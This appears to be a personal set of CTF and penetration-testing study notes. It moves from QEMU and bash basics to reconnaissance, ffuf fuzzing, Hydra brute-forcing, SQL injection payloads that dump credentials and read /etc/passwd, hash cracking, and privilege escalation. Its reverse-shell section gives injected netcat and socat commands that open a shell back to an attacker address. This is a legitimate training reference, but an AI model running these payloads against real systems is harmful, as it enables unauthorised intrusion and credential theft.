% CTF
% Daniel Hiller
% \today
\tableofcontents
\newpage

# CTF

## Introduction

### Contributing

**Found an error or have a suggestion?** Please open an issue on GitHub ([github.com/dentremor/Software-Defined-Infrastrucure](https://github.com/dentremor/Software-Defined-Infrastrucure)):

![QR code to source repository](./static/qr.png){ width=150px }

### License

![AGPL-3.0 license badge](https://www.gnu.org/graphics/agplv3-155x51.png){ width=128px }

Software Defined Infrastructure (c) 2021 Daniel Hiller and contributors

SPDX-License-Identifier: AGPL-3.0
\newpage

## VM

### QEMU

To create a disk image run the following command:
```bash
qemu-img create -f qcow2 disk.qcow2 64G
```

The VM can be executed with a bash script (remove Image.iso with the distro image of your choice):
```bash
#!/bin/bash

qemu-system-x86_64 -enable-kvm -m 4096 -smp $(nproc) -cpu host -device ac97 -audiodev alsa,id=snd0,out.buffer-length=500000,out.period-length=726 -display default,show-cursor=on -usb -device usb-tablet -device virtio-keyboard-pci -net nic -net user -cdrom distro.iso -device virtio-vga-gl -display sdl,gl=on -hda disk.qcow2 -bios /usr/share/edk2/ovmf/OVMF_CODE.fd
```

If you also have a 4k-panel, you probably will face some scaling issues like me. In that case make sure you use `Wayland` instead of `X11`.

## Linux

### Basic Commands

| Command            | Description |
| -----------        | ----------- |
| `whoami`      | Displays current username. |
| `wc`      | print newline, word, and byte counts for each file. |
| `which`      | Locate a command. |
| `id`          | Returns users identity. |
| `hostname`    | Sets or prints the name of current host system. |
| `uname`    | Prints basic information about the operating system name and system hardware. |
| `pwd`    | Returns working directory name. |
| `ifconfig`    | The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters. |
| `ip`    | IP is a utility to show or manipulate routing, network devices, interfaces and tunnels. |
| `netstat`	    | Shows network status. |
| `ss`   | Another utility to investigate sockets. |
| `ps`    | Shows process status. |
| `who`    | Displays who are logged in. |
| `env`   | Prints environment or sets and executes command. |
| `lsblk`    | Lists block devices. |
| `lsusb`   | Lists USB devices. |
| `lsof`    | Lists opened files. |
| `lspci`    | Lists PCI devices. |

### FIND
`find` search for files in a directory hierarchy:
```shell
$ find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2>/dev/null
```

```
*(-type f               = defined the type of the searched object
  -name *.conf          = indicates the name of the object we are looking for
  -user root            = filters all files from a specific user
  -size +20k            = show only files which are larger than 20KiB
  -newermt 2020-03-03   = show only files newer than the specified date
  -exec ls -al {} \;    = this option executes the specified command
  -2>/dev/null          = this redirection ensures that no errors are displayed in the terminal)
```

### Filter Content
`less` is file pager.

`sort` sort lines of text files.

`tr` translate or delete characters.

`column` columnate lists - to display results in tabular form use the flag `-t`.

`wc` print newline, word, and byte counts for each file - `-l` prints line counter 


#### Grep
`grep` print lines matching a pattern. If we want to exclude a result we must use the `-v` flag.

#### Cut
`cut` remove sections from each line of files.

```shell
$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
```
```
*(-d ":"     = Sets a delimiter at the character `:`
  -f1        = Selects only this field in our case the first one)
```
### Locate
`locate` - find files by name

Update the database for `locate`:
```shell
$ sudo updatedb
```

Search for all files that end with `.conf`
```shell
$ locate *.conf
```

### File Descriptors

1. Data Stream for Input
  - STDIN - 0
2. Data Stream for Output
  - STDOUT - 1
3. Data Stream for Output that relates to an error occurring.
  - STDERR – 2

If we want to discard for example all errors and redirect the data into a file we can use:
```shell
$ find /etc/ -name shadow 2> stderr.txt 1> stdout.txt
```

## Bash Scripting

If we want to execute a bash script we can do this by the following command:

```shell
$ <interpreter> script.sh <optional arguments>
```

Run a bash script with persistent permissions (`-p`):
``` bash
$ ./bashscript -p
```

In the first line we can specify the interpreter but if we call the script with another one, the defined in the `shebang` will be ignored:

```shell
#!/bin/bash
```

This is also possible with other scripting languages like Python `#!/usr/bin/env python`.
### Conditional Execution

The rough basic structure is as follows:

```shell
if [[ -z "$string" ]]; then
  echo "String is empty"
elif [[ -n "$string" ]]; then
  echo "String is not empty"
fi
```
#### Operators

String comparison operators "`<` / `>`" **works only** within the double square brackets `[[ <condition> ]]`. 

| Command            | Description |
| -----------        | ----------- |
| `[[ -z STRING ]]`      | Empty string |
| `[[ -n STRING ]]`      | Not empty string |
| `[[ STRING == STRING ]]`      | Equal |
| `[[ STRING != STRING ]]`          | Not Equal |
| `[[ NUM -eq NUM ]]`    | Equal |
| `[[ NUM -ne NUM ]]`    | Not equal |
| `[[ NUM -lt NUM ]]`    | Less than |
| `[[ NUM -le NUM ]]`    | Less than or equal |
| `[[ NUM -gt NUM ]]`    | Greater than |
| `[[ NUM -ge NUM ]]`	    | Greater than or equal |
| `[[ -o noclobber ]]`   | If OPTIONNAME is enabled |
| `[[ ! EXPR ]]`    | Not |
| `[[ X && Y ]]`    | And |
| `[[ X || Y ]]`    | Or |
| `[[ STRING =~ STRING ]]`   | Regexp |
| `(( NUM < NUM ))`   | Numeric conditions |

#### File Operators

| Command            | Description |
| -----------        | ----------- |
| `[[ -e FILE ]]`      | Exists |
| `[[ -r FILE ]]`      | Readable |
| `[[ -h FILE ]]`      | Symlink |
| `[[ -d FILE ]]`          | Directory |
| `[[ -w FILE ]]`    | Writable |
| `[[ -s FILE ]]`    | Size is > 0 bytes |
| `[[ -f FILE ]]`    | File |
| `[[ -x FILE ]]`    | Executable |
| `[[ FILE1 -nt FILE2 ]]`    | 1 is more recent than 2 |
| `[[ FILE1 -ot FILE2 ]]`	    | 2 is more recent than 1 |
| `[[ FILE1 -ef FILE2 ]]`   | Same files |

### Arguments

It is possible to pass up to 9 arguments (`$0`-`$9`) to a script:

```shell
            $ ./script.sh ARG1 ARG2 ARG3 ... ARG9
ASSIGNMENTS:       $0      $1   $2   $3 ...   $9
```

### Special Variables

| Command            | Description |
| -----------        | ----------- |
| `$#`      | This variable holds the number of arguments passed to the script. |
| `$@`      | This variable can be used to retrieve the list of command-line arguments. |
| `$n`      | Each command-line argument can be selectively retrieved using its position. For example, the first argument is found at `$1`. |
| `$$`          | The process ID of the currently executing process. |
| `$?`    | The exit status of the script. This variable is useful to determine a command's success. The value 0 represents successful execution, while 1 is a result of a failure. |

### Variables

It is important that when assigning a variable there is **no space** around the equal sign:

```shell
variable="test"
```

### Arrays

The values in the array are separated by spaces. If we want to escape these spaces, we can use single quotes (`'`...`'`) or double quotes (`"`...`"`).

```shell
#!/bin/bash

domains=(www.inlanefreight.com ftp.inlanefreight.com vpn.inlanefreight.com www2.inlanefreight.com)

echo ${domains[0]}
```

### Arithmetic

| Operator            | Description |
| -----------        | ----------- |
| `+`      | Addition |
| `-`      | Subtraction |
| `*`      | Division |
| `%`          | 	Modulus |
| `variable++`    | Increase the value of the variable by 1 |
| `variable--`    | Decrease the value of the variable by 1 |

We can also calculate the length of the variable. Using this function `${#variable}`, every character gets counted, and we get the total number of characters in the variable.

### Input Control

Read input from the user, while the script is running:

```shell
read -p "Select your option: " opt
```
```
*(-p    = Ensures that our input remains on the same line
  opt   = The input will be stored in the variable opt)
```

### Output Control

In some cases the scripts take longer time and the user don't have any feedback. To solve this problem we can use `tee`, which enables us to write something to a file and also returning it as standard output:

```shell
netrange=$(whois $ip | grep "NetRange\|CIDR" | tee -a CIDR.txt)
```
```
*(-a   = Append to the given FILEs, do not overwrite)
```

### Loops

#### For Loops

The idea behind for loops is that we iterate over something, or we have a limit how often the loop should run.

*Syntax - Examples*

```shell
for $variable in 1 2 3 4
do
	echo $variable
done


for $variable in file1 file2 file3
do
	echo $variable
done


for ip in "10.10.10.170 10.10.10.174 10.10.10.175"
do
	ping -c 1 $ip
done
```

#### While Loops

The while loop will be executed as long the condition is fulfilled. There are two keywords available which gives us more control over the while loop.

- `break` → Interrupts the loop 
- `continue` → Immediately continues with the next loop run

*Syntax - Examples*

```shell
#!/bin/bash

counter=0

while [ $counter -lt 10 ]
do
  # Increase $counter by 1
  ((counter++))
  echo "Counter: $counter"

  if [ $counter == 2 ]
  then
    continue
  elif [ $counter == 4 ]
  then
    break
  fi
done
```

#### Until Loops

Nevertheless, the until loop works precisely like the while loop, but with the difference:

- The code inside an until loop is executed as long as the particular condition is false

### Switch case

The keyword for a switch-case-statement starts with the keyword `case`, followed by the variable or value as an expression, which is then compared in the pattern. If the variable or value matches the expression, then the statements are executed after the parenthesis and ended with a double semicolon (`;;`).

*Syntax - Examples*

```shell
read -p "Select your option: " opt

case $opt in
	"1") network_range ;;
	"2") ping_host ;;
	"3") network_range && ping_host ;;
	"*") exit 0 ;;
esac
```

### Functions

The definition of a function is at the beginning of a bash script this ensures that it is already defined before it is called.

*Syntax - Examples*

```shell
# Method 1 - Functions

function name {
	<commands>
}

# Method 2 - Functions

name() {
	<commands>
}
```

The function is called only by calling the specified name of the function.

#### Parameter Passing

In principle, the same applies to the passed parameters as to parameters passed to a shell script. These are `$1` - `$9` (`${n}`), or `$variable` as we have already seen. Each function has its own set of parameters. So they do not collide with those of other functions or the parameters of the shell script

*Syntax - Examples*

```shell
#!/bin/bash

function print_pars {
	echo $1 $2 $3
}

one="First parameter"
two="Second parameter"
three="Third parameter"

print_pars "$one" "$two" "$three"
```

#### Return Values

Like our bash script, the functions return status codes:

| Return Code        | Description |
| -----------        | ----------- |
| `1`      | General errors |
| `2`      | 	Misuse of shell builtins |
| `126`      | Command invoked cannot execute |
| `127`          |  Command not found |
| `128`    | Invalid argument to exit |
| `128+n`    | Fatal error signal "`n`" |
| `130`    | Script terminated by Control-C |
| `255\*`    | Exit status out of range |

To get the value of a function back, we can use several methods like `return`, `echo`, or a `variable`.

*Syntax - Examples*

```shell
#!/bin/bash

function given_args {

        if [ $# -lt 1 ]
        then
                echo -e "Number of arguments: $#"
                return 1
        else
                echo -e "Number of arguments: $#"
                return 0
        fi
}

# No arguments given
given_args
echo -e "Function status code: $?\n"

# One argument given
given_args "argument"
echo -e "Function status code: $?\n"

# Pass the results of the funtion into a variable
content=$(given_args "argument")

echo -e "Content of the variable: \n\t$content"
```

### Debugging

Bash allows us to debug our code by using the "`-x`" (`xtrace`) and "`-v`" (`verbose`) options.

### Cheat Sheet

For more information about bash scripting have a look in the following cheat sheet: [devhints](https://devhints.io/bash)

## Information Gathering

### Passive Information Gathering

`whois` can be used for querying domain names, IP addresses, or autonomous systems.

#### DIG

`dig` is a DNS lookup utility.

`WaybackMachine` is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.

```shell
$ dig any google.com @8.8.8.8
```
```
*(any         = query all types of records
  @8.8.8.8    = define a dns server from which you wnat to retrieve the information)
```

#### Project Sonar

To find all available subdomains we can use `Project Sonar`:

```shell
$ export TARGET="facebook.com"
$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r '.[]' | sort -u
```

#### Certificates

To gain more information we can search for certificates at sites like [crt.sh](https://crt.sh) and [search.censys.io](https://search.censys.io/certificates).

### Active Information Gathering

`Wappalyzer` is a browser extension which finds out what technologies are used on a website.

`WAFW00F` is a Web Application Firewall Fingerprinting Tool.

`Aquatone` is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.

#### WhatWeb

`WhatWeb` is a Web scanner - identify technologies used by
websites.

```shell
$ whatweb -a 1 https://www.facebook.com -v
```
```
*(-a    = Set the aggression level. 1(low) - 4(high) 
  -v    = verbose)
```
#### Active Subdomain Enumeration (Zone transfer)

1. Identifying Nameservers:
    ```shell
    nslookup -type=NS <target>
    ```

2. Testing for `ANY` and `AXFR` Zone Transfer:
    ```shell
    nslookup -type=any -query=AXFR <target> <nameserver>
    ```

#### Gobuster - DNS

First we need to create our pattern file, which is described in Project Sonar section. Now we can export the parameters and run the `gobuster` command.

```shell
$ export TARGET="facebook.com"
$ export NS="d.ns.facebook.com"
$ export WORDLIST="numbers.txt"
$ gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"
```
```text
*(-q   = Don't print the banner and other noise
  -r   = Use custom DNS server
  -d   = A target domain name
  -p   = Path to the patterns file
  -w   = Path to the wordlist
  -o   = Output file)
```

## ffuf

`ffuf` is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.

### Performance

To increase the speed of `ffuf` we can increase the number of threads with the `-t` flag, but it is important that we don't give `ffuf` too much power because it could lead in a `DoS`.

```shell
$ ffuf -w <SNIP> -u <SNIP> -t 200
```

### Directory Fuzzing

With the `-w` flag we can pass our wordlist, with `-u` the URL we want to fuzz. 
To tell `ffuf` where we want to fuzz, we need to place the `FUZZ` keyword this can look like the following command:

```shell
$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
```

### Page Fuzzing

If we want, we can combine two keywords in one search. For that we can use `FUZZ_1.FUZZ_2`.
#### Extension Fuzzing

```shell
$ ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

#### Page Fuzzing

```shell
$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

### Recursive Fuzzing

```shell
$ ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```
```text
*(-recursion              = scans the directory recursive
  -recursion-depth 1      = only fuzz the current directory and their direct sub-directories
  -e .php                 = specify the extension
  -v                      = output the full URLs)
```

### Subdomain Fuzzing

```shell
$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.example.com/
```

### Vhost Fuzzing

```shell
$ ffuf -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com' -fs xxx
```
```
*(-H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon
  -fs xxx                     = filter all incorrect results)
```

### Parameter Fuzzing

#### GET Request

```shell
$ ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```
```
*(-fs xxx   = filter all incorrect results)
```
#### POST Request

```shell
$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
```
*(-X                          = HTTP method to use
  -d                          = POST data
  -H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon
  -fs xxx                     = filter all incorrect results)
```

#### Value Fuzzing

```shell
$ ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
```
*(-X                          = HTTP method to use
  -d                          = POST data
  -H 'Host: FUZZ.example.com' = Header `"Name: Value"`, separated by colon
  -fs xxx                     = filter all incorrect results)
```

## Exploiting Network Services

### GitHub Repos
[SecLists] (https://github.com/danielmiessler/SecLists)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### SSH
Authenticate via ssh with the key-file `id_rsa`:
``` bash
$ ssh -i id_rsa user@10.10.10.10
```
```text
*(-i [file]  = Identity file)
```


### NMAP
Checks open ports in defined range and check running services with `Nmap`:
```bash
$ nmap 10.10.221.8 -sV -p- -v
```
```text
*(-p-  = Scans the whole portrange
  -v   = verbose
  -p   = Specific port or portrange
  -sV  = Attempts to determine the version of the service running on port
  -A   = Enables OS detection, version detection, script scanning and traceroute)
```

### FTP
Download a File from an FTP-Server with `Wget`:
```bash
$ wget -m ftp://user:password@ftp.example.com
```
```text
*(-m = --mirror)
```

#### Hydra
Use `Hydra` for cracking password in our example on an FTP-Service:
```bash
$ hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```
```text
*(-t 4      = Number of parallel connections per target
  -l [user] = Points to the user who's account you're trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [ftp]     = Sets the protocol)
```

On PHP

```shell
hydra -l admin -P /usr/shared/rockyou.txt <ip> http-post-form "/login.php?username=^USER^&password=^PASS^:F=Invalid Username or Password"
```

```shell
hydra http-post-form -U # For help
```

### NFS
List name or `NFS` shares:
```bash
$ /usr/sbin/showmount -e [IP]
```
```text
*(-e    = Shows the NSF server's export list
  [IP]  = The IP Address of the NFS server)
```

Connect `NFS` share with mount point on our machine:
```bash
$ sudo mount -t nfs IP:share /tmp/mount/ -nolock
```
```text
*(-t nfs    = Type of device to mount, then specifying that it's NFS
  IP:share  = The IP Address of the NFS server, and the name of the share we wish to mount
  -nolock   = Specifies not to use NLM locking)
```

### SMTP
There are three relevant commands, when it comes to `SMTP`:
```text
(VRFY    = Confirming the names of valid users
 EXPN    = Reveals the actual address of user’s aliases and lists of e-mail (mailing lists)
 RCPT TO = Specifies the e-mail address of the recipient)
```

### Metasploit
```text
*(search [name]                 = Search for a module and his description
  use [name]                    = Selects a module by name
  options                       = When a module is selected we will see the options of the module
  set [option] [parameter]      = Set a specific option with a specific parameter
  run                           = Run the exploit)
```
For further information see the following documentation: 
[offensive-security.com](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)

### SQL injection
#### Types
1. In-band
1.1 Union Based
1.1 Error Based
2. Blind
2.1 Boolean Based
2.2 Time Based
3. Out-of-band

#### SQLi Discovery

| Payload       | URL Encoded |
| -----------    | ----------- |
| `'`      | `%27`  |
| `"`      | 	`%22` |
| `#`      | `%23`  |
| `;`      |  `%3B` |
| `)`      | `%29`  |

If we add one of the above payloads and observe any weird behavior from the webpage, we can assume that there is a SQL injection possible.

For example, we can now try an `OR Injection`.

```sql
admin' or '1'='1
```

When there is no hint for a valid username we can repeat this for the password.

For more Payloads please have a look in the [PayloadsAllTheThings Project](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass).

#### Comments

| Comment       | Description |
| -----------    | ----------- |
| `-- `      | Inline - Must contain a whitespace after the two dashes!  |
| `#`      | Inline - Note correct URL encoding |
| `/**/ `      | Inline - Unusual |

#### Union Clause

If we use the union clause it is important that we ensure that the data type on the selected columns are the same.

It can appear that we query two columns from a table and want to union it with another single column. In that case, we have to add another column and fill it with junk. For example `NULL`, because it fits all data types.

```sql
SELECT * from products where product_id = '1' UNION SELECT username, NULL from passwords
```

#### Union Injection

To check the amount of columns we can use the `ORDER BY` or `UNION` function. If we exceed the number of columns we generate an error and therefore know the maximum number.

```sql
anything' UNION select 1,2,3-- 
```
```test
Dont forget the whitespace after the double dash!
```

As a part of our `UNION` injection we can try to determine more information about the database.

| Information       | Payload |
| -----------    | ----------- |
| Comments      | `SELECT @@version` |
| Current User      | `SELECT user();`, `SELECT system_user();` |
| List Users      | `SELECT user FROM mysql.user; — priv` |
| List Password Hashes      | `SELECT host, user, password FROM mysql.user; — priv` |

#### Enumeration

To get data with a `UNION SELECT` we need to create proper `SELECT` queries. Therefor it is essential for us to know the schema conditions. This can be realized by enumeration.

In our first step, we want to know what databases are present on the system. A matching injection could look like the following:

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
```

Now that we have an overview of the databases, let's see which one we are in.

```sql
cn' UNION select 1,database(),2,3-- 
```

An overview over the different tables could look like the following:

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
```

The last information that we need are the name of the columns.

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
```

Now that we have all the information, we can start querying data.

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- 
```

#### Reading Files

There are two ways (`UNION SELECT` or `SELECT`) to check which rights our user has.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- 
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```

##### User Privileges

Now that we know our user, we need to know which privileges he has.

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
```

When we have several users we can only show the privileges of the searched user.

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="larry"-- 
```

To check other privileges then the root user privilege we can use one of the following command.

```sql
SELECT sql_grants FROM information_schema.sql_show_grants
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
```

##### LOAD_FILE

If the OS user has enough privileges we can use the `LOAD_FILE()` function to read files from the system.

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
```

To see the Code press `[Ctrl + U]`.

#### Writing Files

Requirements:
  1. User with `FILE` privilege enabled
  2. MySQL global `secure_file_priv` variable not enabled
  3. Write access to the location we want to write to on the back-end server

### MySQL

To ensure that we are working with a `MySQL` Server we can use the following commands.

| Payload       | When to Use | Expected Output | Wrong Output |
| -----------    | ----------- | ----------- | ----------- |
| `SELECT @@version` | When we have full query output | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)` | When we only have numeric output | `1` | 	Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS |

First we need a client, which is in our case `default-mysql-client`:
```bash 
$ mysql -h [IP] -P [port] -u [username] -p
```
```text
*(-h [IP]        = Connect to the MariaDB server on the given host
  -u [username]  = The MariaDB user name to use when connecting to the server
  -P [port]      = The port to use for the connection
  -p             = The password to use when connecting to the server)
```

1. `SHOW DATBASES;`
2. `USE <database>;`
3. `SHOW TABLES;`
4. `SELECT * FROM <tablename>;`

#### Cracking Credentials

If we do not have any credentials we can use `Nmap` or `Metasplot` to gain this information:
```bash
$ nmap --script=mysql-enum [target]
```
```text
*(--script=mysql-enum           = Scan with a single script: mysql-enum
  [target]                      = The IP address of the target)
```

Now that we know some usernames of the database, we can try to crack the passwords of them with `Hydra`:
```bash
hydra -t 16 -l root -P /usr/share/wordlists/rockyou.txt -vV 10.10.6.199 mysql
```
```text
*(-t 16     = Number of parallel connections per target
  -l [user] = Points to the user who's account you're trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [mysql]   = Sets the protocol)
```
#### Cheat Sheets
- [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
### John the Ripper
If we have a hash which look something like the following example:
```
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```
We can pipe the hash in a file:
```bash
$ echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt
```
And crack the password with `John the Ripper`:
```bash
$ john hash.txt
$ john --show --format=RAW-MD5 hash.txt
```
```text
*(--show            = show cracked passwords
  --format=<param>  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt
```

### Hashcat


```shell
$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt
```
## Web Fundamentals

### HTTP

There are several headers we can face:

| Header Type        | Message Type |    Description |
| -----------        | ----------- |  ----------- |
| General Headers   | request & response | Describes the message rather than the content |
| Entity Headers    | request & response | 	Describes the content |
| Request Headers   |  request | HTTP requests are messages sent by the client to initiate an action on the server |
| Response Headers  |  response | HTTP responses are messages sent by a server in response to a request message |
| Security Headers  | response | These define certain policies and rules when accessing a web page, which the browser must follow |

For further information please have a look at [Mozilla's mdn web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

The most commonly used request methods are:

- `GET`
- `POST`
- `HEAD`
- `PUT`
- `DELETE`
- `OPTIONS`
- `PATCH`

#### GET Request

We can gain information about the version of the web server and the operating system with the curl flag `-I` which returns us the `http header`:

```shell
$ curl -I "http://${TARGET}"
```
```
*(-I  = return HTTP header)
```

If we face `HTTP authentication` we can pass our credentials with one of the following two commands:

```shell
$ curl -u admin:admin http://${TARGET}
$ curl  http://admin:admin@<SERVER_IP>:<PORT>/ 
```
```
*(-u  = pass credentials to the server)
```

`X-Powered-By header` can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.

`Cookies` are another value to look at as each technology by default has its cookies. Some default cookies are:

- .NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE>
- PHP: PHPSESSID=<COOKIE_VALUE>
- JAVA: JSESSION=<COOKIE_VALUE>

We have the ability to pass headers with our request with `-H`. This can be useful if, for example, we want to provide an authorization token. 

```shell
$ curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/
```
```
*(-H  = pass a header)
```

If we want to repeat a request from the browser with `cURL`, we can copy (`copy -> copy as cURL`) the request as a curl command from the network tab.

It may happen that the server reflects the response to us in a JSON format. To be able to read it better, we have the possibility to improve the presentation.

```shell
$ curl -s http://<SERVER_IP>:<PORT>/api.php/city/le | jq
```
```
*(-s  = silent
  jq  = Command-line JSON processor)
```

#### POST Request

It mostly appears that we have to log in with a `POST` request. In this case we can use command from below.

```shell
$ curl -L -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/ -i -v
```
```
*(-L  = If the server reports that the requested page  has  moved to a different location  this option will make curl redo the request on  the  new  place
  -X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -i  = Include protocol response headers in the output
  -v  = verbose)
```

With a successful authentication, we should gain a cookie from the `Set-Cookie` header. For all subsequent requests we can use this cookie to authenticate us.

```shell
$ curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/
```
```
*(-b <data|filename> = Pass the data to the HTTP server in the Cookie header)
```

In some cases it can appear that we have to use a `JSON` format
```shell
$ curl -X POST -d '{"search":"london"}' -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php
```
```
*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -b <data|filename> = Pass the data to the HTTP server in the Cookie header
  -H  = pass a header)
```

#### PUT Request

The `PUT` request looks very similar to the `POST` request and can be used to modify information on a source.

```shell
$ curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'
```
```
*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -H  = pass a header)
```

#### DELETE Request

To delete information we can use the `DELETE` request.

```shell
$ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City'
```
```
*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use)
```
### Curl
If we want to get sources of a webpage, we can do this with `Curl`:
```shell
$ curl -X GET http://10.10.4.59:8081/ctf/post.html
```
```text
*(-X [GET]          = Set kind of fetch method
  [target]          = The URL of the webpage we want to fetch
  -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)
```

We can also save files with the `-0` flag:
```bash
$ curl -O inlanefreight.com/index.html -o home.html -s -v
```
```text
*(-0    = Save the output into a file
  -o    = Sepcify the filename
  -s    = Silent the status
  -v    = verbose)
```
To retrieve an even more verbose output use the `-vvv` flag.
The certificate check can be skipped with the `-k` flag, when establish a `https` connection via curl.


`CEWL` password list generator.

`WPSCAN` scans the Word Press version.

`Gobuster` is a tool used to brute-force URIs including directories and files as well as DNS subdomains.

`DIRB` is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.

### Web Applications

[OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing)

Exploit databases:

- (Exploit DB)[https://www.exploit-db.com/]
- (Rapid7 DB)[https://www.rapid7.com/db/]
- (Vulnerability Lab)[https://www.vulnerability-lab.com/]
### Reverse Shell

#### Netcat

Listener:
```shell
$ nc -lvnp 4242
```

Victim:
```shell
$ ;nc -e /bin/sh 10.0.0.1 4242
```

#### Socat

Lister:
```shell
$ socat -d -d TCP4-LISTEN:4443 STDOUT
```

Victim (Linux):
```shell
$ ;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash
```

Victim (Windows):
```shell
$ ;socat TCP4:192.168.168.1:4443 EXEC:'cmd.exe',pipes
```

#### Stabilize Shell

You can stabilize the shell with the python module `pty`:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

For more information checkout the following GitHub repo: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

If you gain access depending on the OS you can try the following commands to get more information:
>Linux
```shell
  $ whoami
  $ id
  $ ifconfig/ip addr
  $ uname -a                  # print system information
  $ ps -ef                    # -e = select all processes  -f = do full-format listing
  $ less /etc/passwd          # usernames with UID, GID, GECOS, home directory and login shell
  $ cut -d: -f1 /etc/passwd   # only usernames
  $ cat /etc/os-release       # Get inforamtion about the OS and the OS version
```
>Windows
```shell
  $ whoami
  $ ver
  $ ipconfig
  $ tasklist
  $ netstat -an
  ```

### Privilege Escalation

#### Exploiting SUID

```shell
find / -perm /4000 2>/dev/null
```

```shell
sudo chmod +s bash
```
